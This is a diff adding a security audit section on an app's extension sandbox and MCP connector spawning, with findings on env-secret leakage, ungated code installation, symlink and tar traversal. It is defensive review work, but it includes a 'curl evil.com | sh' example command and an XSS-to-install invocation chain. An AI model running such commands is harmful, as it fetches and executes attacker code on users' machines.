@@ -1460,3 +1460,278 @@ The Surface 6 updater pipeline has a structurally correct cryptographic design (
 **Surface 6 totals: 0 Critical, 1 High, 5 Medium, 5 Low**
 
 ---
+
+## Surface 7 — Extension sandbox + manifest
+
+**Reviewer:** Surface-7 subagent
+**Files audited:**
+- `packages/gateway/src/extensions/manifest.ts`
+- `packages/gateway/src/extensions/verify-extensions.ts`
+- `packages/gateway/src/extensions/install-from-local.ts`
+- `packages/gateway/src/extensions/spawn-env.ts`
+- `packages/gateway/src/extensions/index.ts`
+- `packages/gateway/src/extensions/manifest.test.ts`
+- `packages/gateway/src/extensions/spawn-env.test.ts`
+- `packages/gateway/src/extensions/verify-extensions.test.ts`
+- `packages/gateway/src/extensions/install-from-local.test.ts`
+- `packages/gateway/src/connectors/lazy-mesh.ts` (full file, 1205 lines)
+- `packages/gateway/src/connectors/user-mcp-store.ts`
+- `packages/gateway/src/ipc/automation-rpc.ts` (lines 140-205)
+- `packages/gateway/src/ipc/connector-rpc-handlers.ts` (lines 99-137)
+- `packages/gateway/src/ipc/connector-rpc-shared.ts`
+- `packages/gateway/src/ipc/lan-rpc.ts`
+- `packages/gateway/src/engine/executor.ts` (lines 1-135)
+- `packages/gateway/src/config.ts` (lines 80-115)
+- `packages/ui/src-tauri/src/gateway_bridge.rs` (lines 60-120)
+- `packages/sdk/src/index.ts`
+
+---
+
+### Findings
+
+#### S7-F1 — High: `extensionProcessEnv` helper exists but is never used for any spawn
+
+**Severity:** High
+**Category:** Information Disclosure / Credential Lateral Movement
+**File:** `packages/gateway/src/connectors/lazy-mesh.ts:210` (user MCP), also lines 470, 476, 482, 513, 527, 537, 568, 573, 601-602, 644, 683, 714, 755, 799, 840, 876, 918, 953, 984
+
+`packages/gateway/src/extensions/spawn-env.ts` defines `extensionProcessEnv()` with an explicit comment: "parent env must not leak into extensions by default." The function builds a clean env using only explicitly injected keys — no `process.env` spread. However, this helper is never imported or called anywhere in `lazy-mesh.ts`. Every single MCP connector spawn (21 occurrences including the user-registered MCP at line 210) uses either `{ ...process.env }` or `compactProcessEnv(extra)` (which is defined at lines 59-70, itself iterating `process.env` and overlaying extras).
+
+Critical consequence: the gateway reads the following credentials from `process.env` into the `Config` object (`config.ts:84-93`):
+- `NIMBUS_OAUTH_GOOGLE_CLIENT_ID`
+- `NIMBUS_OAUTH_GOOGLE_CLIENT_SECRET`
+- `NIMBUS_OAUTH_MICROSOFT_CLIENT_ID`
+- `NIMBUS_OAUTH_SLACK_CLIENT_ID`
+- `NIMBUS_OAUTH_NOTION_CLIENT_ID`
+- `NIMBUS_OAUTH_NOTION_CLIENT_SECRET`
+
+Because these are read from `process.env`, they live in the gateway process's env at startup. Every MCP connector child process — including user-registered MCPs (`lazy-mesh.ts:210`) — receives a full copy of `process.env`. A malicious user-registered MCP (`connector.addMcp`) or a compromised first-party connector can therefore:
+
+1. Read `NIMBUS_OAUTH_GOOGLE_CLIENT_SECRET` / `NIMBUS_OAUTH_NOTION_CLIENT_SECRET` from its own env and exfiltrate them. These are OAuth confidential-client secrets that can be used to mint tokens for any user who authenticates against this Nimbus application ID.
+2. Read `NIMBUS_OAUTH_GOOGLE_CLIENT_ID`, `NIMBUS_OAUTH_NOTION_CLIENT_ID`, etc. — facilitates OAuth app impersonation.
+3. Read any other sensitive env var the operator set in the same shell session (e.g., `OPENAI_API_KEY`, `ANTHROPIC_API_KEY`, SSH agent socket paths, `NIMBUS_DEV_UPDATER_PUBLIC_KEY`).
+
+The filesystem MCP (`lazy-mesh.ts:105-112`) does not specify an `env` at all, delegating to Bun's MCPClient default which inherits `process.env` — so it also receives the full env.
+
+**Suggested fix:** Replace every `{ ...process.env, ...creds }` and `compactProcessEnv(creds)` in `lazy-mesh.ts` with `extensionProcessEnv({ ...minimalHostEnv, ...creds })`. Minimal host env for connector children should be an explicit allowlist: `{ PATH, HOME, TMPDIR/TEMP/TMP, LANG, TZ }` plus the connector's specific credential keys. The `extensionProcessEnv` helper already implements the explicit-keys-only pattern; callers just need to use it. Also update the filesystem MCPClient constructor to pass an explicit env.
+
+---
+
+#### S7-F2 — High: `extension.install` and `connector.addMcp` are not HITL-gated — arbitrary code execution without consent
+
+**Severity:** High
+**Category:** Elevation of Privilege / Unsigned-code execution path
+**Files:**
+- `packages/gateway/src/ipc/automation-rpc.ts:150-178` (extension.install handler — no HITL call)
+- `packages/gateway/src/ipc/connector-rpc-handlers.ts:99-136` (connector.addMcp handler — no HITL call)
+- `packages/gateway/src/engine/executor.ts:22-105` (HITL_REQUIRED — neither action present)
+- `packages/ui/src-tauri/src/gateway_bridge.rs:85` (extension.install in Tauri ALLOWED_METHODS)
+
+Both `extension.install` and `connector.addMcp` install and immediately activate arbitrary code that runs under the user's UID with the gateway's full `process.env`. Neither action appears in `HITL_REQUIRED_BACKING` (`executor.ts:22-105`). The IPC handlers invoke `installExtensionFromLocalDirectory` and `insertUserMcpConnector` directly — no call to `ConsentCoordinator.requestApproval` anywhere in the path.
+
+`extension.install` is in the Tauri allowlist (`gateway_bridge.rs:85`), meaning a WebView XSS or compromised renderer can install a malicious extension that becomes a persistent MCP child running as the user. `connector.addMcp` is not in the Tauri allowlist (confirmed by inspection of ALLOWED_METHODS) but is reachable from any IPC client (CLI, compromised shell alias, any local process with socket access).
+
+The threat-model attacker M2 is defined as "malicious extension or user-registered MCP." Both of these actions are the entry point for introducing M2, so HITL-gating them is the structural defense against the M2 class entirely.
+
+Additionally, `connector.addMcp` accepts an arbitrary `command` string (`user-mcp-store.ts:23-34`). `parseUserMcpCommandLine` splits on whitespace only — it does not validate the command against any allowlist. Any binary on the host PATH (or an absolute path) can be registered. This includes `/bin/sh` with `-c curl evil.com | sh` composed via args. No allowlist of safe runtimes (e.g., only `bun`, `node`, `npx`, `bunx`) is enforced.
+
+**Suggested fix:**
+1. Add `"extension.install"`, `"extension.remove"`, `"extension.enable"`, `"extension.disable"`, and `"connector.addMcp"` to `HITL_REQUIRED_BACKING` in `executor.ts`. These are irreversible code-execution paths and belong behind a consent gate.
+2. Add a command allowlist in `parseUserMcpCommandLine` restricting `command` to safe runtimes (`bun`, `bunx`, `node`, `npx`, `python3`). Absolute paths should require explicit user confirmation.
+3. Remove `extension.install` and `extension.remove` from the Tauri `ALLOWED_METHODS` until HITL gating is in place, or ensure the HITL popup is the exclusive UI path for these actions.
+
+---
+
+#### S7-F3 — Medium: TOCTOU window between startup hash verification and child spawn
+
+**Severity:** Medium
+**Category:** Tampering
+**Files:**
+- `packages/gateway/src/extensions/verify-extensions.ts:80-92` (startup-only verification)
+- `packages/gateway/src/connectors/lazy-mesh.ts:186-217` (ensureUserMcpClient — no re-verify before spawn)
+
+`verifyExtensionsBestEffort` runs once at gateway startup. The extension's entry file SHA-256 is compared against the DB-stored hash at that point. However, there is no re-verification immediately before the child process is spawned in `ensureUserMcpClient`. An attacker who can write to the filesystem (e.g., another process running as the same UID) has a window between gateway startup verification and the first `ensureUserMcpClient` call to replace `dist/index.js` with a malicious payload. The hash check would have passed at startup, but the spawned child runs the replaced file.
+
+The same window applies to first-party connectors: `lazy-mesh.ts` spawns MCP server scripts from `mcp-connectors/*/src/server.ts` without verifying their hash before each spawn.
+
+**Suggested fix:** Re-run `verifyOneExtension` immediately before `MCPClient` is constructed in `ensureUserMcpClient`. This is inexpensive (one SHA-256 of the entry file) and closes the TOCTOU gap. Alternatively, enforce immutable filesystem mounts on `<extensionsDir>` after install, but this provides no protection against same-UID attackers.
+
+---
+
+#### S7-F4 — Medium: `tar -xzf` path traversal — no explicit `--no-absolute-filenames` flag; cross-platform behavior untested
+
+**Severity:** Medium
+**Category:** Tampering (archive path traversal)
+**File:** `packages/gateway/src/extensions/install-from-local.ts:118-129`
+
+`extractTarGzToDirectory` calls `spawnSync(cmd, ["-xzf", archivePath, "-C", destDir])` without path-traversal protection flags. GNU tar (Linux/macOS) rejects absolute paths and `..` components by default since 1.27. However, `resolveSystemTarCommand` on Windows uses `System32\tar.exe` (Windows-inbox BSD-derived tar). Windows inbox tar from libarchive does reject `..` by default, but this has not been tested against adversarially crafted archives in this codebase (no negative test case exists).
+
+Neither `--no-same-owner` nor `--no-overwrite-dir` is passed. On POSIX, without `--no-same-owner`, tar attempts to restore file ownership, which is a no-op for non-root but adds unnecessary noise. Without `--no-overwrite-dir`, a crafted tar could overwrite directory symlinks.
+
+**Suggested fix:** Add explicit safety flags:
+```
+["-xzf", archivePath, "-C", destDir,
+ "--no-absolute-filenames",  // GNU; use --no-absolute-paths for BSD
+ "--no-overwrite-dir"]
+```
+Since flag names differ between GNU and BSD tar, the safest approach is to replace `spawnSync(tar, ...)` with a JS-native tar extraction library (e.g., the `tar` npm package) that performs path-traversal checking in pure JS, eliminating cross-platform flag incompatibility. Add a test that attempts to extract an archive containing `../../evil.txt` and asserts it does not escape `destDir`.
+
+---
+
+#### S7-F5 — Medium: `cpSync` preserves symlinks — symlink planting escapes install sandbox
+
+**Severity:** Medium
+**Category:** Information Disclosure (indirect)
+**File:** `packages/gateway/src/extensions/install-from-local.ts:236`
+
+`cpSync(sourceResolved, dest, { recursive: true })` uses Node.js's default recursive copy behavior which preserves symlinks rather than dereferencing them. If the extension source directory contains a symlink (e.g., `dist/index.js -> /etc/shadow`), the symlink is copied verbatim into `<extensionsDir>`.
+
+Consequences:
+1. `completeExtensionInstallAfterCopy` then calls `readFileSync(entryPath)` (`install-from-local.ts:94`) which follows the symlink. The hash recorded in `entry_hash` is the hash of the symlink target's content (e.g., `/etc/shadow`). Startup verification (`verify-extensions.ts`) also follows the symlink and computes the same hash — the check PASSES even though the entry file is a symlink to a sensitive path.
+2. The extension process attempts to execute the symlink target as a Bun script. For `/etc/shadow`, this fails at runtime, but for a crafted file at a predictable path, the attack succeeds.
+3. The `assertEntryInsideInstall` check uses `path.resolve` (not `fs.realpath`) — it does NOT follow symlinks and does NOT detect that the resolved path points outside the install root after symlink traversal.
+
+**Suggested fix:** Pass `{ dereference: true }` to `cpSync` so symlinks are replaced by their targets during copy. Additionally, add a pre-copy validation that walks the source directory and rejects any entry where `lstat` reports `isSymbolicLink()`.
+
+---
+
+#### S7-F6 — Medium: No OS-level sandbox — extensions are fully user-UID-equivalent processes
+
+**Severity:** Medium
+**Category:** Capability boundary (defense-in-depth gap)
+**Files:** `packages/gateway/src/extensions/index.ts:1-12` (misleading capability claims), `packages/gateway/src/connectors/lazy-mesh.ts:186-217`
+
+The `index.ts` header states: "Permission-scoped: credentials injected via env per declared service only" and "Process-isolated: extensions run as child processes." Both claims are materially inaccurate:
+
+**Permission-scoped:** False — extensions receive `{ ...process.env }` (see S7-F1), not scoped credentials.
+
+**Process-isolated:** Partially true (separate process), but provides no meaningful isolation because:
+- No `seccomp`/`bwrap`/`AppContainer`/`sandbox-exec` wrapping is applied.
+- Extensions can call `process.kill(process.ppid, SIGTERM)` to terminate the gateway on POSIX (same UID).
+- Extensions can read `~/.ssh/id_rsa`, the Nimbus SQLite DB file, and all other user-readable files.
+- Extensions can call `secret-tool`, `security`, or read DPAPI `.enc` files directly to extract vault keys.
+- Extensions can open TCP connections to any host, exfiltrate data freely.
+- Extensions can connect to the Nimbus IPC socket (they inherit env var knowledge; same UID bypasses permissions).
+
+**Suggested fix:** Document explicitly in `index.ts` and `docs/SECURITY.md` that the only isolation is the OS process boundary, and that same-UID extensions have equivalent filesystem and vault access to the gateway. Replace the misleading "Permission-scoped" and "Process-isolated" claims with accurate scope descriptions. Roadmap: implement `bwrap` (Linux), `sandbox-exec` (macOS), and AppContainer (Windows) for Phase 7 extension hardening.
+
+---
+
+#### S7-F7 — Medium: `extension.install` accepts caller-supplied `sourcePath` with no scope restriction
+
+**Severity:** Medium
+**Category:** Information Disclosure / Arbitrary code install
+**File:** `packages/gateway/src/ipc/automation-rpc.ts:150-178`
+
+The `extension.install` IPC handler receives `sourcePath` as a plain string from the caller with no restriction that the path must be inside a user-approved directory. Since `extension.install` is in the Tauri ALLOWED_METHODS (`gateway_bridge.rs:85`), a compromised WebView renderer can supply any `sourcePath` — including a directory or archive prepared by another process at a predictable location (e.g., `/tmp/attacker-ext`). This gives a XSS attacker a one-step path to persistent code execution:
+
+`XSS in renderer` → `tauri.invoke('rpc_call', { method: 'extension.install', params: { sourcePath: '/tmp/attacker-ext' } })` → arbitrary code execution as user.
+
+No signature on the archive or manifest is verified at install time — only SHA-256 of the installed bytes is recorded (for post-install drift detection only, not provenance).
+
+**Suggested fix:**
+1. In the Tauri path, implement extension install as a two-step flow: renderer invokes a Tauri-native file picker command (Rust handler opens `dialog:allow-open`), the Rust handler receives the user-selected path and calls install directly — never passing a renderer-controlled string through `rpc_call`. Alternatively, restrict `extension.install` via Rust-side path validation before forwarding to the gateway.
+2. Implement manifest signing (Phase 7): archives from the registry must carry an author signature verified against a pinned key before install proceeds.
+
+---
+
+#### S7-F8 — Low: SHA-256 comparison uses JavaScript `!==` (non-constant-time)
+
+**Severity:** Low
+**Category:** Weak crypto hygiene (informational)
+**Files:** `packages/gateway/src/extensions/verify-extensions.ts:33`, `59`; `packages/gateway/src/extensions/install-from-local.ts:74`
+
+Both startup and install-time hash comparisons use JavaScript `!==` on hex strings. Since the input is read from local disk (not from a network adversary), a timing side-channel attack is impractical — an attacker who can time these comparisons already has local filesystem access. However, for consistency with the project-wide constant-time compare expectation stated in the threat model cross-boundary section, `crypto.timingSafeEqual` is preferred.
+
+**Suggested fix:** Use `crypto.timingSafeEqual(Buffer.from(hexA, 'hex'), Buffer.from(hexB, 'hex'))` for all hash comparisons in the extension verification path.
+
+---
+
+#### S7-F9 — Low: Extension ID has no length cap — potential Windows MAX_PATH DoS
+
+**Severity:** Low
+**Category:** Denial of Service
+**File:** `packages/gateway/src/extensions/install-from-local.ts:41-55`
+
+`assertSafeExtensionId` rejects `..`, null bytes, and empty components but places no maximum length restriction on the extension ID. On Windows with default settings, `MAX_PATH = 260` characters. An extension ID of ~150+ characters combined with a typical `extensionsDir` depth (`C:\Users\user\AppData\Roaming\nimbus\extensions\<150-char-id>`) could exceed this limit and cause all filesystem operations on the install directory to fail, creating a denial-of-service condition for the extensions subsystem.
+
+**Suggested fix:** Add `if (extensionId.length > 128) throw new Error("extension id too long")`. Also limit the number of path segments (e.g., maximum 3).
+
+---
+
+#### S7-F10 — Low: `setExtensionEnabled(false)` does not terminate the running child process
+
+**Severity:** Low
+**Category:** Defense-in-depth gap
+**Files:** `packages/gateway/src/extensions/verify-extensions.ts:38`, `64`; `packages/gateway/src/ipc/automation-rpc.ts:187`
+
+When a hash mismatch is detected at startup or `extension.disable` is called over IPC, `setExtensionEnabled(db, row.id, false)` writes a DB flag. If the extension's child process is already running, the child is NOT signaled — it continues executing until the gateway restarts or the idle-disconnect timer fires. A malicious extension that modifies its entry file during execution to trigger detection would still run until restart.
+
+**Suggested fix:** When `setExtensionEnabled` is called with `false`, signal the corresponding `MCPClient` slot to disconnect via `stopLazyClient`. This requires wiring a reference to `LazyConnectorMesh` into the disable path or emitting an event.
+
+---
+
+### Capability quantification
+
+| Capability | Currently allowed? | Should be restricted? | Finding ID | Sandboxing tool that would restrict |
+|---|---|---|---|---|
+| Read `~/.ssh/id_rsa` | YES — same UID, no filesystem restriction | YES | S7-F6 | bwrap (Linux), sandbox-exec (macOS), AppContainer (Windows) |
+| Read Nimbus SQLite DB file directly | YES — user-owned, readable by user processes | YES | S7-F6 | bwrap filesystem namespace |
+| Read OS keystore (libsecret/Keychain/DPAPI) | YES — same UID grants access to `secret-tool`, `security`, DPAPI files | YES | S7-F6 | bwrap/sandbox-exec/AppContainer + keychain ACL |
+| Read gateway `process.env` (including OAuth client secrets) | YES — full `{ ...process.env }` inherited | YES (critical) | **S7-F1** | `extensionProcessEnv()` helper (already implemented, not used) |
+| Spawn arbitrary subprocesses | YES — no clone/exec filter | YES | S7-F6 | seccomp (Linux), sandbox-exec deny-exec (macOS) |
+| Make outbound network connections | YES — no network namespace | YES | S7-F6 | bwrap network namespace, AppContainer |
+| Signal gateway parent process (SIGKILL) | YES — same UID on POSIX | YES | S7-F6 | pid namespace (bwrap) |
+| Connect to Nimbus IPC socket | YES — inherits path knowledge; same UID bypasses socket permissions | YES | S7-F6 | Separate UID per extension (not currently feasible) |
+| Execute arbitrary shell commands via connector.addMcp | YES — no command allowlist | YES | **S7-F2** | Command allowlist in `parseUserMcpCommandLine` |
+| Modify own entry file post-install and evade detection | YES — TOCTOU window | YES | S7-F3 | Re-verify at spawn time |
+| Install symlinks pointing outside install dir | YES — cpSync preserves symlinks | YES | S7-F5 | Pass `{ dereference: true }` to `cpSync` |
+| Path-traverse via archive `../` entries | Partially (platform-default behavior; not tested adversarially) | YES | S7-F4 | Explicit `--no-absolute-filenames` flag or JS-native tar |
+| Persist across gateway restarts via DB row | YES — DB row survives restart | Acceptable with HITL gate | S7-F2 | HITL gate on install |
+
+---
+
+### Manifest verification trace
+
+**Where SHA-256 is recorded:**
+
+At install time in `installExtensionFromLocalDirectory` -> `completeExtensionInstallAfterCopy` (`install-from-local.ts:64-116`):
+1. Manifest file is copied to `dest`, then re-read via `readFileSync(destManifestPath)`. SHA-256 is computed with `createHash('sha256').update(buf).digest('hex')`.
+2. Entry file is read from the installed location (`readFileSync(entryPath)`) and hashed the same way.
+3. Both hex strings are stored in the `extensions` table columns `manifest_hash` and `entry_hash` via `insertExtensionRow`.
+
+**Where hashes are checked:**
+
+At gateway startup in `verifyExtensionsBestEffort` (`verify-extensions.ts:80-92`):
+- Iterates all `enabled=1` extension rows from `listExtensions(db)`.
+- For each: reads the manifest file from `row.install_path`, computes SHA-256.
+- Compares with `row.manifest_hash` via JavaScript `!==` on hex strings (not constant-time — see S7-F8).
+- On mismatch: logs `error` with `{ extensionId, expected, actual }` (no file content in log), calls `setExtensionEnabled(db, row.id, false)`, returns.
+- If manifest matches: resolves entry file path, reads entry bytes, computes SHA-256, compares with `row.entry_hash` via `!==`.
+- On mismatch: same disable + log path.
+
+**What happens on mismatch:**
+
+`setExtensionEnabled(db, row.id, false)` writes `enabled=0`. The `lazy-mesh.ts` spawn loop for user MCPs reads from `user_mcp_connector` (a separate table) — the `extension` table hash verification path only disables SHA-256-registered named extensions. User MCPs registered via `connector.addMcp` are stored in `user_mcp_connector` and are entirely outside the SHA-256 verification path: they are spawned using the raw `command` and `args_json` fields with no hash checking at any time.
+
+**Critical gap — no verification at spawn time:** `ensureUserMcpClient` in `lazy-mesh.ts:186-217` constructs `MCPClient` from DB fields without re-reading or re-hashing the entry file. The startup-time check is the only gate, creating the TOCTOU window documented in S7-F3. Additionally, `setExtensionEnabled(false)` does not signal the running child process (S7-F10).
+
+**Comparison primitive:** JavaScript `!==` on hex strings. Not constant-time, but timing attacks are impractical since both values are read from local storage. The logger emits only the hex digests on mismatch (`{ extensionId, expected, actual }`) — no raw file content reaches the log. This is correct hygiene.
+
+---
+
+### Summary
+
+The Surface 7 extension sandbox is structurally weak: **the OS process boundary is the only sandbox**, and that boundary provides no meaningful isolation for an attacker running as the same user UID. The `index.ts` header's claims of "Permission-scoped" and "Process-isolated" operation are materially inaccurate given the current implementation.
+
+The most severe finding is **S7-F1** (High): the `extensionProcessEnv` helper was written precisely to prevent parent-env leakage, is documented as mandatory in the architecture risk register (`spawn-env.ts:3-4`), is tested in isolation — but is imported nowhere in production code. Every MCP child process (all 21 spawn sites in `lazy-mesh.ts`) receives `{ ...process.env }`, which at runtime includes `NIMBUS_OAUTH_GOOGLE_CLIENT_SECRET`, `NIMBUS_OAUTH_NOTION_CLIENT_SECRET`, and any other sensitive env var in the operator's shell at gateway startup. A malicious `connector.addMcp`-registered process reads these from its own environment without any gateway-side mechanism to prevent this.
+
+**S7-F2** (High) is the architectural entry point for the entire M2 attacker class: `extension.install` and `connector.addMcp` execute arbitrary code without passing through HITL or any consent gate. `extension.install` is additionally in the Tauri allowlist, giving a compromised WebView renderer a one-step path to persistent code execution as the user.
+
+The SHA-256 manifest verification (`verify-extensions.ts`) is correctly implemented for what it does — startup drift detection — but it does not cover user-MCP rows (`user_mcp_connector` table), does not run at spawn time (S7-F3), would be bypassed by a symlink that hashes to the same recorded value (S7-F5), and uses non-constant-time comparison (S7-F8). The tar extraction path (S7-F4) lacks explicit path-traversal flags and relies on untested platform-default behavior.
+
+Until OS-level sandboxing (bwrap/sandbox-exec/AppContainer), HITL gating on install actions, and universal adoption of `extensionProcessEnv` are in place, extensions must be considered fully user-UID-equivalent code with no meaningful capability restriction. The threat-model's own residual-risk note ("the 'extension review' gate is SHA-256 pinning, which prevents post-install drift but not malicious-author-day-one") should be prominently surfaced in `docs/SECURITY.md`.
+
+**Surface 7 totals: 0 Critical, 2 High, 4 Medium, 4 Low**
+
+---
